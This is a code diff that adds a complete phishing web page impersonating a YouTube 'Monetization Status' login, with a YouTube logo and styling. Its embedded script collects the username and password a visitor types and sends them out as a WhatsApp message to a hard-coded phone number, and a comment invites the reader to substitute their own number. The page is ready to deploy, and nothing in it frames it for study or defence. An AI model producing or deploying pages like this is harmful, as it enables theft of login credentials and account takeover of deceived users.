@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Page</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f44336; /* YouTube Red */
+        }
+        .login-container {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            width: 300px;
+        }
+        .logo {
+            width: 100px;
+            margin-bottom: 10px;
+        }
+        input {
+            width: 90%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+        }
+        button {
+            background-color: #25D366; /* WhatsApp Green */
+            color: white;
+            padding: 10px 15px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-container">
+        <img src="youtube-logo.png" alt="YouTube Logo" class="logo">
+        <h2>YOUTUBE MONETIZATION STATUS</h2>
+        <input type="text" id="username" placeholder="Enter Username">
+        <input type="password" id="password" placeholder="Enter Password">
+        <button onclick="sendToWhatsApp()">Login</button>
+    </div>
+
+    <script>
+        function sendToWhatsApp() {
+            var username = document.getElementById("username").value;
+            var password = document.getElementById("password").value;
+            var phoneNumber = "918590690984"; // Replace with your WhatsApp number
+
+            if (username === "" || password === "") {
+                alert("Please fill in both fields.");
+                return;
+            }
+
+            var message = `Login Attempt:\nUsername: ${username}\nPassword: ${password}`;
+            var whatsappURL = `https://wa.me/${phoneNumber}?text=${encodeURIComponent(message)}`;
+
+            window.location.href = whatsappURL;
+        }
+    </script>
+
+</body>
+</html>
